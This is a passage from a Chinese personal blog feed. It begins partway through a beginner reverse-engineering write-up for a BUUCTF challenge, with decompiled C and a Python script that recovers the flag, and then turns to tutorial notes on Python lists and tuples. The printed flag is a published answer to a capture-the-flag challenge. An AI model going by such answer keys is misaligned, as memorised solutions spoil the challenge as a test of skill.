class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> stat_loc; <span class="comment">// [rsp+4h] [rbp-3Ch]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  <span class="keyword">__pid_t</span> pid; <span class="comment">// [rsp+Ch] [rbp-34h]</span></span><br><span class="line">  <span class="keyword">char</span> s2; <span class="comment">// [rsp+10h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v8; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  pid = fork();</span><br><span class="line">  <span class="keyword">if</span> ( pid )</span><br><span class="line">  &#123;</span><br><span class="line">    argv = (<span class="keyword">const</span> <span class="keyword">char</span> **)&amp;stat_loc;</span><br><span class="line">    waitpid(pid, &amp;stat_loc, <span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="built_in">strlen</span>(&amp;flag); ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *(&amp;flag + i) == <span class="string">'i'</span> || *(&amp;flag + i) == <span class="string">'r'</span> )</span><br><span class="line">        *(&amp;flag + i) = <span class="string">'1'</span>;<span class="comment">//很简单，将字符串中的i和r字符替换成 数字 1</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"input the flag:"</span>, argv);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%20s"</span>, &amp;s2);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(&amp;flag, &amp;s2) )<span class="comment">//进去看字符串：&#123;hacking_for_fun&#125;</span></span><br><span class="line">    result = <span class="built_in">puts</span>(<span class="string">"this is the right flag!"</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = <span class="built_in">puts</span>(<span class="string">"wrong flag!"</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上脚本</p><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># a = "&#123;hacking_for_fun&#125;"</span></span><br><span class="line"><span class="meta"># b = "1"</span></span><br><span class="line"><span class="meta"># for i in range(len(a)):</span></span><br><span class="line"><span class="meta">#     if (a[i]=='i')| (a[i]=='r'):</span></span><br><span class="line"><span class="meta">#         print(b, end="")</span></span><br><span class="line"><span class="meta">#     else:</span></span><br><span class="line"><span class="meta">#         print(a[i],end="")</span></span><br><span class="line"></span><br><span class="line">x = <span class="string">"&#123;hacking_for_fun&#125;"</span></span><br><span class="line">y = x.replace(<span class="string">'i'</span>,<span class="string">'1'</span>)</span><br><span class="line">z = y.replace(<span class="string">'r'</span>,<span class="string">'1'</span>)</span><br><span class="line">print(z)</span><br><span class="line"><span class="meta">#&#123;hack1ng_fo1_fun&#125;</span></span><br></pre></td></tr></table></figure><h1 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h1><blockquote><p>这个平台是一朋友推荐的，嗯,前几题简直是送分题！不过听说后面会难起来！<br><img src="https://s2.ax1x.com/2019/09/27/uuZMAU.jpg" alt="uuZMAU.jpg"></p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;今天不开心，我怎么也不能原谅自己，这个年纪了，该争取的就该上点心！！！这段时间没有更新博客，后来呢要一天一更！努力跑吧，走着真的来不及！今天开刷BUUCTF！&lt;/p&gt;
    
    </summary>
    
    
      <category term="re" scheme="http://yoursite.com/tags/re/"/>
    
  </entry>
  
  <entry>
    <title>python系统学习03</title>
    <link href="http://yoursite.com/2019/09/19/python%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A003/"/>
    <id>http://yoursite.com/2019/09/19/python系统学习03/</id>
    <published>2019-09-19T15:55:47.000Z</published>
    <updated>2019-09-19T18:12:40.198Z</updated>
    
    <content type="html"><![CDATA[<p>稳住，我可以的！今天学了脱壳，明天正确把De1CTF的Re_Sign给做出来！</p><a id="more"></a><h1 id="列表："><a href="#列表：" class="headerlink" title="列表："></a>列表：</h1><blockquote><p>列表可以一次性存储多个数据，且可以为不同的数据类型。类似C语言中的数组</p></blockquote><blockquote><p>列表是可变类型</p></blockquote><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">name_list=[<span class="string">'Yang1k'</span>,<span class="string">'mutou'</span>,<span class="string">'luobo'</span>]</span><br><span class="line"><span class="builtin-name">print</span>(name_list)</span><br><span class="line"><span class="builtin-name">print</span>(name_list[2])</span><br><span class="line"><span class="builtin-name">print</span>(name_list[0])</span><br><span class="line"></span><br><span class="line"><span class="comment"># ['Yang1k', 'mutou', 'luobo']</span></span><br><span class="line"><span class="comment"># luobo</span></span><br><span class="line"><span class="comment"># Yang1k</span></span><br></pre></td></tr></table></figure><h2 id="列表的而常用操作：增删改查"><a href="#列表的而常用操作：增删改查" class="headerlink" title="列表的而常用操作：增删改查"></a>列表的而常用操作：增删改查</h2><h3 id="查："><a href="#查：" class="headerlink" title="查："></a>查：</h3><h4 id="index"><a href="#index" class="headerlink" title="index()"></a>index()</h4><blockquote><p>返回指定数据所在的而下标</p></blockquote><blockquote><p>列表序列.index(数据,开始位置下标,结束位置下表)</p></blockquote><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">name_list=[<span class="string">'Yang1k'</span>,<span class="string">'mutou'</span>,<span class="string">'luobo'</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(name_list.index(<span class="string">'mutou'</span>,<span class="number">0</span>,<span class="number">2</span>)</span></span>)#<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(name_list.index(<span class="string">'yangmutou'</span>,<span class="number">0</span>,<span class="number">2</span>)</span></span>)#不存在则报错</span><br></pre></td></tr></table></figure><h4 id="count"><a href="#count" class="headerlink" title="count()"></a>count()</h4><blockquote><p>统计指定数据在当前列表中出现的次数。</p></blockquote><blockquote><p>列表序列.count(数据)</p></blockquote><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">name_list=[<span class="string">'Yang1k'</span>,<span class="string">'mutou'</span>,<span class="string">'luobo'</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(name_list.count(<span class="string">'Yang1k'</span>)</span></span>)#<span class="number">1</span></span><br></pre></td></tr></table></figure><h4 id="len"><a href="#len" class="headerlink" title="len()"></a>len()</h4><blockquote><p>返回列表长度，即列表中的数据的个数</p></blockquote><blockquote><p>语法count(列表)</p></blockquote><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">name_list=[<span class="string">'Yang1k'</span>,<span class="string">'mutou'</span>,<span class="string">'luobo'</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(len(name_list)</span></span>)#<span class="number">3</span></span><br></pre></td></tr></table></figure><h4 id="in"><a href="#in" class="headerlink" title="in"></a>in</h4><blockquote><p>判断指定数据在某个列表序列，如果在 返回True，否则返回Flase</p></blockquote><h4 id="not-in"><a href="#not-in" class="headerlink" title="not in"></a>not in</h4><blockquote><p>tongsah</p></blockquote><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">name_list=[<span class="string">'Yang1k'</span>,<span class="string">'mutou'</span>,<span class="string">'luobo'</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(<span class="string">'luobo'</span> in name_list)</span></span>#True</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(<span class="string">'Tom'</span> in name_list)</span></span> #False</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(<span class="string">'luobo'</span> not in name_list)</span></span>#False</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(<span class="string">'Tom'</span> not in name_list)</span></span>#True</span><br></pre></td></tr></table></figure><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#小举例：</span></span><br><span class="line">name_list=[<span class="string">'Yang1k'</span>,<span class="string">'mutou'</span>,<span class="string">'luobo'</span>]</span><br><span class="line"></span><br><span class="line"><span class="attribute">name</span>=input('请输入你搜索的名字')</span><br><span class="line"><span class="keyword">if</span> name <span class="keyword">in</span> name_list:</span><br><span class="line">    <span class="builtin-name">print</span>(f<span class="string">'您输入的名字是&#123;name&#125;，名字已经存在'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="builtin-name">print</span>(f<span class="string">'您输入的名字是&#123;name&#125;，名字不存在'</span>)</span><br></pre></td></tr></table></figure><h3 id="增"><a href="#增" class="headerlink" title="增"></a>增</h3><blockquote><p>增加指定数据列表中</p></blockquote><h4 id="append"><a href="#append" class="headerlink" title="append()"></a>append()</h4><blockquote><p>append():列表结尾追加数据</p></blockquote><blockquote><p>语法：列表序列.append(数据)</p></blockquote><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">name_list=[<span class="string">'Yang1k'</span>,<span class="string">'mutou'</span>,<span class="string">'luobo'</span>]</span><br><span class="line"></span><br><span class="line">name_list.append(<span class="string">'Tom'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(name_list)</span></span>#[<span class="string">'Yang1k'</span>, <span class="string">'mutou'</span>, <span class="string">'luobo'</span>, <span class="string">'Tom'</span>]</span><br></pre></td></tr></table></figure><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">name_list=[<span class="string">'Yang1k'</span>,<span class="string">'mutou'</span>,<span class="string">'luobo'</span>]</span><br><span class="line"></span><br><span class="line">name_list.append([<span class="string">'xiaoming'</span>,<span class="string">'xiaohong'</span>])</span><br><span class="line"></span><br><span class="line">print(name_list) #[<span class="string">'Yang1k'</span>, <span class="string">'mutou'</span>, <span class="string">'luobo'</span>, [<span class="string">'xiaoming'</span>, <span class="string">'xiaohong'</span>]]</span><br></pre></td></tr></table></figure><blockquote><p>这里注意下append()追加的数据是一个数据，则追加整个序列到列表</p></blockquote><h4 id="extend"><a href="#extend" class="headerlink" title="extend()"></a>extend()</h4><blockquote><p>extend():列表结尾追加数据，如果数据是一个序列，则将这个序列逐一添加到列表</p></blockquote><blockquote><p>语法：列表序列.exterd(数据)</p></blockquote><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">name_list=[<span class="string">'Yang1k'</span>,<span class="string">'mutou'</span>,<span class="string">'luobo'</span>]</span><br><span class="line"></span><br><span class="line">name_list.extend([<span class="string">'xiaoming'</span>,<span class="string">'xiaohong'</span>])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(name_list)</span></span> #[<span class="string">'Yang1k'</span>, <span class="string">'mutou'</span>, <span class="string">'luobo'</span>, <span class="string">'xiaoming'</span>, <span class="string">'xiaohong'</span>]</span><br><span class="line"></span><br><span class="line">name_list.extend(<span class="string">'tom'</span>)</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(name_list)</span></span></span><br><span class="line">#[<span class="string">'Yang1k'</span>, <span class="string">'mutou'</span>, <span class="string">'luobo'</span>, <span class="string">'xiaoming'</span>, <span class="string">'xiaohong'</span>, <span class="string">'t'</span>, <span class="string">'o'</span>, <span class="string">'m'</span>]</span><br></pre></td></tr></table></figure><h4 id="insert"><a href="#insert" class="headerlink" title="insert()"></a>insert()</h4><blockquote><p>insert():列表指定位置（下标）追加数据</p></blockquote><blockquote><p>语法：列表序列.insert(位置下表,数据)</p></blockquote><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">name_list=[<span class="string">'Yang1k'</span>,<span class="string">'mutou'</span>,<span class="string">'luobo'</span>]</span><br><span class="line"></span><br><span class="line">name_list.insert(<span class="number">1</span>,<span class="string">'Tom'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(name_list)</span></span>#[<span class="string">'Yang1k'</span>,<span class="string">'Tom'</span>,<span class="string">'mutou'</span>, <span class="string">'luobo'</span>]</span><br></pre></td></tr></table></figure><h3 id="删"><a href="#删" class="headerlink" title="删"></a>删</h3><h4 id="del"><a href="#del" class="headerlink" title="del"></a>del</h4><blockquote><p>删除整个列表 或者 列表中指定下表的而数据</p></blockquote><blockquote><p>语法：del 数据</p></blockquote><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">name_list=[<span class="string">'Yang1k'</span>,<span class="string">'mutou'</span>,<span class="string">'luobo'</span>]</span><br><span class="line"><span class="selector-tag">del</span> name_list[<span class="number">1</span>]</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(name_list)</span></span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">del</span> name_list</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(name_list)</span></span></span><br><span class="line"><span class="selector-id">#name</span> <span class="string">'name_list'</span> is not defined  说明这个列表被删了，不存在了！</span><br></pre></td></tr></table></figure><h4 id="pop"><a href="#pop" class="headerlink" title="pop()"></a>pop()</h4><blockquote><p>删除列表中指定下表的而数据，如果不指定下标的话，默认删除最后一个数据，这个要注意  删除的数据可以返回</p></blockquote><blockquote><p>语法：列表序列.pop()</p></blockquote><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">name_list=[<span class="string">'Yang1k'</span>,<span class="string">'mutou'</span>,<span class="string">'luobo'</span>]</span><br><span class="line">a= name_list.pop()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(name_list)</span></span>#[<span class="string">'Yang1k'</span>, <span class="string">'mutou'</span>]</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(a)</span></span>#luobo</span><br><span class="line"></span><br><span class="line">b=name_list.pop(<span class="number">1</span>)</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(name_list)</span></span>#[<span class="string">'Yang1k'</span>]</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(b)</span></span>#mutou</span><br></pre></td></tr></table></figure><h4 id="remove"><a href="#remove" class="headerlink" title="remove()"></a>remove()</h4><blockquote><p>删除列表中指定数据</p></blockquote><blockquote><p>语法：列表序列.remove(数据)</p></blockquote><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">name_list=[<span class="string">'Yang1k'</span>,<span class="string">'mutou'</span>,<span class="string">'luobo'</span>]</span><br><span class="line"></span><br><span class="line">name_list.<span class="builtin-name">remove</span>(<span class="string">'mutou'</span>)</span><br><span class="line"><span class="builtin-name">print</span>(name_list)#[<span class="string">'Yang1k'</span>, <span class="string">'luobo'</span>]</span><br></pre></td></tr></table></figure><h3 id="改"><a href="#改" class="headerlink" title="改"></a>改</h3><h4 id="sort"><a href="#sort" class="headerlink" title="sort()"></a>sort()</h4><blockquote><p>排序</p></blockquote><blockquote><p>语法：列表序列.sort(key=None,reverse=False) </p></blockquote><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">reverse</span>=<span class="literal">True</span>：降序</span><br><span class="line"><span class="attr">reverse</span>=<span class="literal">False</span>：升序（默认）</span><br></pre></td></tr></table></figure><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">num_list=[<span class="number">1</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">2</span>,<span class="number">7</span>,<span class="number">3</span>]</span><br><span class="line">num_list.sort()</span><br><span class="line">print(num_list)#[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">7</span>]</span><br><span class="line"></span><br><span class="line">num_list.sort(reverse=True)</span><br><span class="line">print(num_list)#[<span class="number">7</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>]</span><br></pre></td></tr></table></figure><h4 id="copy"><a href="#copy" class="headerlink" title="copy()"></a>copy()</h4><blockquote><p>拷贝</p></blockquote><blockquote><p>语法：列表序列.copy</p></blockquote><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#数据很重要，操作前要记得备份一份原始数据</span></span><br><span class="line">name_list1=[<span class="string">'Yang1k'</span>,<span class="string">'mutou'</span>,<span class="string">'luobo'</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">name_list2=name_list1.copy()</span><br><span class="line"></span><br><span class="line">print(name_list1)</span><br><span class="line">print(name_list2)</span><br><span class="line"></span><br><span class="line"><span class="meta"># [<span class="string">'Yang1k'</span>, <span class="string">'mutou'</span>, <span class="string">'luobo'</span>]</span></span><br><span class="line"><span class="meta"># [<span class="string">'Yang1k'</span>, <span class="string">'mutou'</span>, <span class="string">'luobo'</span>]</span></span><br></pre></td></tr></table></figure><h2 id="列表循环遍历"><a href="#列表循环遍历" class="headerlink" title="列表循环遍历"></a>列表循环遍历</h2><blockquote><p>一次性访问列表的每个数据</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#while</span></span><br><span class="line">name_list=[<span class="string">'Yang1k'</span>,<span class="string">'mutou'</span>,<span class="string">'luobo'</span>]</span><br><span class="line">i=0</span><br><span class="line"><span class="keyword">while</span> i&lt;len(name_list):</span><br><span class="line">    <span class="built_in">print</span>(name_list[i])</span><br><span class="line">    i+=1</span><br><span class="line">    </span><br><span class="line">  <span class="comment"># Yang1k</span></span><br><span class="line">    <span class="comment"># mutou</span></span><br><span class="line">    <span class="comment"># luobo</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#for</span></span><br><span class="line">name_list=[<span class="string">'Yang1k'</span>,<span class="string">'mutou'</span>,<span class="string">'luobo'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> name_list:</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> <span class="comment"># Yang1k</span></span><br><span class="line">    <span class="comment"># mutou</span></span><br><span class="line">    <span class="comment"># luobo</span></span><br></pre></td></tr></table></figure><h2 id="列表嵌套"><a href="#列表嵌套" class="headerlink" title="列表嵌套"></a>列表嵌套</h2><blockquote><p>列表里包含着其它子列表</p></blockquote><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">name_list=[[<span class="string">'小明'</span>,<span class="string">'小红'</span>,<span class="string">'小兰'</span>],[<span class="string">'Yang1k'</span>,<span class="string">'mutou'</span>,<span class="string">'luobo'</span>],[<span class="string">'aaa'</span>,<span class="string">'bbb'</span>,<span class="string">'ccc'</span>]]</span><br><span class="line">#找到 luobo</span><br><span class="line"></span><br><span class="line">#第一步:按下标找到luobo在的列表</span><br><span class="line">print(name_list[<span class="number">1</span>])#[<span class="string">'Yang1k'</span>, <span class="string">'mutou'</span>, <span class="string">'luobo'</span>]</span><br><span class="line">#第二步:从luobo在的列表，再按下标找到数据找到luobo</span><br><span class="line">print(name_list[<span class="number">1</span>][<span class="number">2</span>])#luobo</span><br></pre></td></tr></table></figure><h2 id="随机分配办公室"><a href="#随机分配办公室" class="headerlink" title="随机分配办公室"></a>随机分配办公室</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">    <span class="comment"># 1.需求: 8位老师， 3个办公室，将8位老师随机分配到3个办公室2</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment">#   步骤:</span></span><br><span class="line">    <span class="comment">#   1.：准备数据</span></span><br><span class="line">    <span class="comment">#   1.1： 8位老师-- 列表</span></span><br><span class="line">    <span class="comment">#   1.2 ：3个办公室-列表联套</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment">#   2.分配老师到办公有</span></span><br><span class="line">    <span class="comment">#   ***随机分配</span></span><br><span class="line">    <span class="comment">#   就是把老师的名字写入到办公室列表--办公在列表追加老师务产数据</span></span><br><span class="line">    <span class="comment">#   3.总证是否分配成功</span></span><br><span class="line">    <span class="comment">#   打印办公金详细信息:每个办公室的人数和对应的老师名字</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="comment"># 1.准备数据</span></span><br><span class="line">teachers=[<span class="string">'A'</span>,<span class="string">'B'</span>,<span class="string">'C'</span>, <span class="string">'D'</span>,<span class="string">'E'</span>,<span class="string">'F'</span>,<span class="string">'G'</span>,<span class="string">'H'</span>]</span><br><span class="line">offices = [[], [],[]]</span><br><span class="line"><span class="comment"># 2.分配老师到办公室-- 取到每个老师放到办公室列表--遍历老师列表数据</span></span><br><span class="line"><span class="keyword">for</span> name <span class="keyword">in</span> teachers:</span><br><span class="line"><span class="comment">#列表追加数据-- append (选中) extend insert</span></span><br><span class="line"><span class="comment"># xx[0] --不能指定是具体某个下标--随机</span></span><br><span class="line">    num = random.randint(<span class="number">0</span>,<span class="number">2</span>)</span><br><span class="line">    offices[num].append(name)</span><br><span class="line"><span class="comment">#print(num)</span></span><br><span class="line"><span class="comment">#print(offices)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 为了更贴合生活，把各个办公室子列表加一个办公室编号1. 2， 3</span></span><br><span class="line">i=<span class="number">1</span></span><br><span class="line"><span class="comment"># 3.验证是否分配成功</span></span><br><span class="line"><span class="keyword">for</span> office <span class="keyword">in</span> offices:</span><br><span class="line"><span class="comment"># 打印办公室人数-- 子列表数据的个数 len()</span></span><br><span class="line">    print(<span class="string">f'办公室<span class="subst">&#123;i&#125;</span>的人数是<span class="subst">&#123;len(office)&#125;</span>，老师分别是: '</span>)  <span class="comment"># 打印老师的名字</span></span><br><span class="line"><span class="comment"># print( ) --  每仁子列表里面的名字个数不一定--遍历--子列表</span></span><br><span class="line">    <span class="keyword">for</span> name <span class="keyword">in</span> office:</span><br><span class="line">        print(name)</span><br><span class="line">i += <span class="number">1</span></span><br></pre></td></tr></table></figure><h1 id="元组"><a href="#元组" class="headerlink" title="元组"></a>元组</h1><blockquote><p>一次性可以存储多个数据，但同列表不同的是  数据不可以修改</p></blockquote><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">num_list = (<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>)</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(num_list[<span class="number">2</span>])</span></span>#<span class="number">30</span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(type(num_list)</span></span>)#&lt;class <span class="string">'tuple'</span>&gt;</span><br><span class="line">num_list[<span class="number">0</span>] = <span class="number">100</span>  <span class="selector-id">#TypeError</span>: <span class="string">'tuple'</span> <span class="selector-tag">object</span> does not support item assignment</span><br></pre></td></tr></table></figure><blockquote><p>但是元组里如果有列表，修改列表里面的数据则是支持的，故自觉很重要</p></blockquote><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">tuple2 = (<span class="number">10</span>, <span class="number">20</span>,[<span class="string">'aaaa'</span>,<span class="string">'bbbbb'</span>,<span class="string">'ccccc'</span>],<span class="number">30</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(tuple2)</span></span>#(<span class="number">10</span>, <span class="number">20</span>, [<span class="string">'aaaa'</span>, <span class="string">'bbbbb'</span>, <span class="string">'ccccc'</span>], <span class="number">30</span>)</span><br><span class="line"></span><br><span class="line">tuple2[<span class="number">2</span>][<span class="number">1</span>]=<span class="string">'a'</span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(tuple2)</span></span>#(<span class="number">10</span>, <span class="number">20</span>, [<span class="string">'aaaa'</span>, <span class="string">'a'</span>, <span class="string">'ccccc'</span>], <span class="number">30</span>)</span><br></pre></td></tr></table></figure><h2 id="定义数组："><a href="#定义数组：" class="headerlink" title="定义数组："></a>定义数组：</h2><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#多个数据元组定义</span></span><br><span class="line">t1=(<span class="number">10</span>,<span class="number">20</span>,'aa')</span><br><span class="line"><span class="keyword">print</span>(<span 